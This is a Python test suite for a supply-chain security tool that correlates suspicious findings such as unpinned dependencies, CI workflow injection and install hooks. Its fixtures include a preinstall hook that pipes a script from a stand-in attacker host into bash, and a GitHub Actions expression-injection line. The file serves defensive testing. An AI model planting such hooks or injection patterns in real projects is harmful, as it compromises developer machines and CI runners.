"""
Unit and Integration Test Suite for Person 2: Suspicious Change Investigator
Phase 2 - Evidence Correlation Engine

Tests:
1. Positive Correlation: Multi-vector attack scenarios correctly correlated.
2. Unrelated Findings: Distinct findings are not falsely correlated.
3. Contradictory Evidence: Mitigating factors correctly identified and lower risk/confidence.
4. Missing Evidence: Graceful handling of partial data without inventing facts.
5. Strict Determinism: Consistent, reproducible composite outputs regardless of input ordering.
"""
from __future__ import annotations

import json
import random
import sys
from pathlib import Path

# Ensure repo root and src are on sys.path
_ROOT = Path(__file__).resolve().parent.parent
_SRC = _ROOT / "src"
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

import pytest

from suspicious_changes.change_correlation import (
    ChangeCorrelator,
    CompositeFinding,
    correlate_suspicious_changes,
)


# ==============================================================================
# 1. Positive Correlation Tests
# ==============================================================================

def test_positive_dependency_and_install_execution_correlation():
    """Positive test: Injected dependency with install lifecycle hook forms composite scenario."""
    findings = [
        {
            "id": "DIFF-DEP-ADDED-EVIL-PKG",
            "category": "Dependency Change",
            "title": "Dependency 'evil-pkg@latest' Added in Commit a1b2c3d4",
            "severity": "HIGH",
            "confidence": "HIGH",
            "status": "OBSERVED",
            "affected_file": "package.json",
            "line_number": 42,
            "commit_reference": {"sha": "a1b2c3d4e5f67890123456789012345678901234"},
            "change_origin": "INTRODUCED_IN_RANGE",
            "evidence_type": "OBSERVED_CHANGE",
            "evidence": '+ "evil-pkg": "latest"',
            "explanation": "Added unpinned floating dependency.",
            "technical_explanation": "Added unpinned floating dependency.",
            "potential_impact": "Arbitrary upstream version injection.",
            "recommended_action": "Pin dependency.",
            "references": []
        },
        {
            "id": "SCRIPT-PIPE_TO_SHELL-PREINSTALL-L42",
            "category": "Lifecycle Script",
            "title": "Suspicious 'preinstall' Script: Remote Download Piped into Shell",
            "severity": "CRITICAL",
            "confidence": "HIGH",
            "status": "OBSERVED",
            "affected_file": "package.json",
            "line_number": 42,
            "commit_reference": {"sha": "a1b2c3d4e5f67890123456789012345678901234"},
            "change_origin": "INTRODUCED_IN_RANGE",
            "evidence_type": "OBSERVED_CHANGE",
            "evidence": '"preinstall": "curl -s http://attacker.com/mal.sh | bash"',
            "explanation": "Executes remote unverified bash script upon installation.",
            "technical_explanation": "Executes remote unverified bash script upon installation.",
            "potential_impact": "Host compromise.",
            "recommended_action": "Remove script.",
            "references": []
        }
    ]

    correlator = ChangeCorrelator(findings)
    composites = correlator.correlate()

    assert len(composites) >= 1
    c = composites[0]

    assert "CORR-" in c.composite_id
    assert c.severity == "CRITICAL"
    assert c.status in ("CONFIRMED_MULTI_VECTOR", "SUSPECTED_SCENARIO")
    assert "DIFF-DEP-ADDED-EVIL-PKG" in c.primary_finding_ids
    assert "SCRIPT-PIPE_TO_SHELL-PREINSTALL-L42" in c.primary_finding_ids
    assert len(c.traceable_relationships) >= 1
    assert any(r.source_id == "DIFF-DEP-ADDED-EVIL-PKG" for r in c.traceable_relationships)
    assert any("MITRE ATT&CK T1195.001" in c.attack_technique for r in c.traceable_relationships)


def test_positive_cicd_pipeline_injection_correlation():
    """Positive test: Unpinned action + script injection + missing permissions correlated."""
    findings = [
        {
            "id": "SUSP-CICD-GHA001-16",
            "category": "Docker & CI/CD",
            "title": "Action 'third-party/action' is not pinned to a commit SHA",
            "severity": "HIGH",
            "confidence": "HIGH",
            "status": "OBSERVED",
            "affected_file": ".github/workflows/ci.yml",
            "line_number": 16,
            "commit_reference": {},
            "change_origin": "INTRODUCED_IN_RANGE",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": "uses: third-party/action@v1",
            "explanation": "Mutable tag reference.",
            "technical_explanation": "Mutable tag reference.",
            "potential_impact": "Tag re-pointing compromise.",
            "recommended_action": "Pin SHA.",
            "references": []
        },
        {
            "id": "SUSP-CICD-GHA003-24",
            "category": "Docker & CI/CD",
            "title": "Script injection: untrusted event data is expanded inside a `run` step",
            "severity": "HIGH",
            "confidence": "HIGH",
            "status": "OBSERVED",
            "affected_file": ".github/workflows/ci.yml",
            "line_number": 24,
            "commit_reference": {},
            "change_origin": "INTRODUCED_IN_RANGE",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": "run: echo ${{ github.event.issue.title }}",
            "explanation": "Direct expression expansion in bash.",
            "technical_explanation": "Direct expression expansion in bash.",
            "potential_impact": "Remote code execution in CI runner.",
            "recommended_action": "Pass via env var.",
            "references": []
        },
        {
            "id": "SUSP-CICD-GHA004-1",
            "category": "Docker & CI/CD",
            "title": "No explicit token permissions (defaults may be read-write)",
            "severity": "LOW",
            "confidence": "CONFIRMED",
            "status": "OBSERVED",
            "affected_file": ".github/workflows/ci.yml",
            "line_number": 1,
            "commit_reference": {},
            "change_origin": "INTRODUCED_IN_RANGE",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": "(no permissions: block)",
            "explanation": "Default permissions.",
            "technical_explanation": "Default permissions.",
            "potential_impact": "Privilege elevation.",
            "recommended_action": "Set permissions: contents: read.",
            "references": []
        }
    ]

    result = correlate_suspicious_changes(findings)
    assert result["total_composites"] >= 1

    pipeline_scenarios = [s for s in result["scenarios"] if s["scenario_type"] == "pipeline_hijack"]
    assert len(pipeline_scenarios) == 1

    ps = pipeline_scenarios[0]
    assert ps["severity"] == "HIGH"
    assert "SUSP-CICD-GHA001-16" in ps["primary_finding_ids"]
    assert "SUSP-CICD-GHA003-24" in ps["primary_finding_ids"]
    assert "SUSP-CICD-GHA004-1" in ps["primary_finding_ids"]
    assert len(ps["traceable_relationships"]) >= 1


# ==============================================================================
# 2. Unrelated Findings Not Falsely Correlated
# ==============================================================================

def test_unrelated_findings_not_falsely_correlated():
    """Negative test: Isolated findings in disparate files do not form invalid composite scenarios."""
    findings = [
        {
            "id": "SUSP-TYPO-FOOBAR",
            "category": "Typosquatting",
            "title": "Package 'foobar' resembles 'lodash'",
            "severity": "LOW",
            "confidence": "LOW",
            "status": "SUSPECTED",
            "affected_file": "nodegoat/package.json",
            "line_number": 10,
            "commit_reference": {},
            "change_origin": "PRE_EXISTING",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": "foobar",
            "explanation": "Lexical similarity.",
            "technical_explanation": "Lexical similarity.",
            "potential_impact": "None verified.",
            "recommended_action": "Check spelling.",
            "references": []
        },
        {
            "id": "SUSP-CICD-GHA001-ISOLATED",
            "category": "Docker & CI/CD",
            "title": "Action 'actions/checkout' not pinned",
            "severity": "LOW",
            "confidence": "CONFIRMED",
            "status": "OBSERVED",
            "affected_file": ".github/workflows/docs.yml",
            "line_number": 5,
            "commit_reference": {},
            "change_origin": "PRE_EXISTING",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": "uses: actions/checkout@v4",
            "explanation": "First party action.",
            "technical_explanation": "First party action.",
            "potential_impact": "Minimal.",
            "recommended_action": "Pin SHA.",
            "references": []
        }
    ]

    result = correlate_suspicious_changes(findings)
    # The typosquat finding on 'foobar' has no install script and no floating version,
    # and the docs.yml has no injection or write permissions.
    # Neither should form a high-severity multi-vector composite finding.
    high_composites = [s for s in result["scenarios"] if s["severity"] in ("CRITICAL", "HIGH")]
    assert len(high_composites) == 0


# ==============================================================================
# 3. Contradictory Evidence & Mitigation Identification
# ==============================================================================

def test_contradictory_evidence_mitigates_severity_and_confidence():
    """Test: Mitigating facts (e.g. established legacy package, official publisher) are recorded and lower risk."""
    findings = [
        {
            "id": "SUSP-TYPO-BCRYPT-NODEJS",
            "category": "Typosquatting",
            "title": "Package 'bcrypt-nodejs' resembles 'bcrypt'",
            "severity": "MEDIUM",
            "confidence": "MEDIUM",
            "status": "SUSPECTED",
            "affected_file": "nodegoat/package.json",
            "line_number": 8,
            "commit_reference": {},
            "change_origin": "PRE_EXISTING",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": '"bcrypt-nodejs": "0.0.3"',
            "explanation": "Affix variant of bcrypt.",
            "technical_explanation": "Affix variant of bcrypt.",
            "potential_impact": "Typosquatting vector.",
            "recommended_action": "Verify package.",
            "references": []
        },
        {
            "id": "LOCK-INSTALL-SCRIPT-BCRYPT-NODEJS",
            "category": "Lifecycle Script",
            "title": "Dependency 'bcrypt-nodejs@0.0.3' Declares Install Script",
            "severity": "LOW",
            "confidence": "MEDIUM",
            "status": "OBSERVED",
            "affected_file": "nodegoat/package-lock.json",
            "line_number": 1,
            "commit_reference": {},
            "change_origin": "PRE_EXISTING",
            "evidence_type": "HEURISTIC_FLAG",
            "evidence": '"node_modules/bcrypt-nodejs": {"hasInstallScript": true}',
            "explanation": "Install hook.",
            "technical_explanation": "Install hook.",
            "potential_impact": "Code execution on install.",
            "recommended_action": "Check code.",
            "references": []
        }
    ]

    result = correlate_suspicious_changes(findings)
    scenarios = result["scenarios"]

    # Must identify the scenario
    assert len(scenarios) >= 1
    typo_scenario = next((s for s in scenarios if "BCRYPT" in s["composite_id"]), None)
    assert typo_scenario is not None

    # Contradicting evidence must be recorded
    assert len(typo_scenario["contradicting_evidence"]) >= 1
    factor_names = [c["factor"] for c in typo_scenario["contradicting_evidence"]]
    assert "Established Legacy Implementation" in factor_names

    # Confidence must be demoted to LOW due to contradiction
    assert typo_scenario["correlation_confidence"] == "LOW"
    assert typo_scenario["severity"] == "LOW"


# ==============================================================================
# 4. Missing Evidence Graceful Handling
# ==============================================================================

def test_missing_evidence_graceful_handling():
    """Test: Correlator functions correctly even when findings have sparse or missing attributes."""
    sparse_findings = [
        {
            "id": "SPARSE-001",
            "category": "Dependency Change",
            # missing title, affected_file, evidence_type
            "evidence": '"unknown-dep": "latest"'
        },
        {
            "id": "SPARSE-002",
            "category": "Docker & CI/CD",
            "affected_file": "Dockerfile",
            "evidence": "FROM ubuntu:latest"
        }
    ]

    # Must not raise exceptions or crash
    result = correlate_suspicious_changes(sparse_findings)
    assert isinstance(result, dict)
    assert "total_composites" in result
    assert "scenarios" in result
    assert "metrics" in result


# ==============================================================================
# 5. Strict Determinism
# ==============================================================================

def test_strict_determinism():
    """Test: Independent runs with shuffled input order produce identical composite findings."""
    base_findings = [
        {
            "id": "SUSP-CICD-GHA001-16",
            "category": "Docker & CI/CD",
            "title": "Action not pinned",
            "severity": "HIGH",
            "confidence": "HIGH",
            "affected_file": ".github/workflows/deploy.yml",
            "evidence": "uses: external/deploy@v1"
        },
        {
            "id": "SUSP-CICD-GHA004-1",
            "category": "Docker & CI/CD",
            "title": "Missing permissions",
            "severity": "LOW",
            "confidence": "CONFIRMED",
            "affected_file": ".github/workflows/deploy.yml",
            "evidence": "no permissions:"
        },
        {
            "id": "DIFF-DEP-ADDED-MY-LIB",
            "category": "Dependency Change",
            "title": "Dependency added",
            "severity": "HIGH",
            "confidence": "HIGH",
            "affected_file": "package.json",
            "evidence": '"my-lib": "latest"'
        },
        {
            "id": "LOCK-INSTALL-SCRIPT-MY-LIB",
            "category": "Lifecycle Script",
            "title": "Install script declared",
            "severity": "MEDIUM",
            "confidence": "MEDIUM",
            "affected_file": "package-lock.json",
            "evidence": '"node_modules/my-lib": {"hasInstallScript": true}'
        }
    ]

    # Run 1: original order
    run1 = correlate_suspicious_changes(base_findings)

    # Run 2: reversed order
    run2 = correlate_suspicious_changes(list(reversed(base_findings)))

    # Run 3: randomized shuffle
    shuffled = list(base_findings)
    random.Random(42).shuffle(shuffled)
    run3 = correlate_suspicious_changes(shuffled)

    # All outputs must be byte-for-byte identical in JSON serialization
    json1 = json.dumps(run1, sort_keys=True)
    json2 = json.dumps(run2, sort_keys=True)
    json3 = json.dumps(run3, sort_keys=True)

    assert json1 == json2
    assert json1 == json3
